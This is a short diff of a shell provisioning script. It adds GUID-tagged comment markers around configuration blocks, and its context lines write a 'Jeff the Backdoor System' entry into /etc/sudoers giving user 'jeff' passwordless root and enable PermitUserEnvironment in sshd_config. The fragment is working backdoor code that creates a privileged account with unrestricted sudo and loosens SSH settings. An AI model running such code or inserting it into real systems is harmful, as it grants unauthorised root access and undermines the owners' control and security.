@@ -20,18 +20,20 @@ adduser --system \
 
 cat <<EOF >>/etc/sudoers
 
+#begin{2db52366-3bbe-11de-8f5f-001b2400005e}
 # JBS (Jeff the Backdoor System)
 jeff ALL=(ALL) NOPASSWD: ALL
-#--
+#end{2db52366-3bbe-11de-8f5f-001b2400005e}
 
 EOF
 
 
 cat <<EOF >>/etc/ssh/sshd_config
 
+#begin{2db52366-3bbe-11de-8f5f-001b2400005e}
 # JBS (Jeff the Backdoor System)
 PermitUserEnvironment yes
-#--
+#end{2db52366-3bbe-11de-8f5f-001b2400005e}
 
 EOF
 
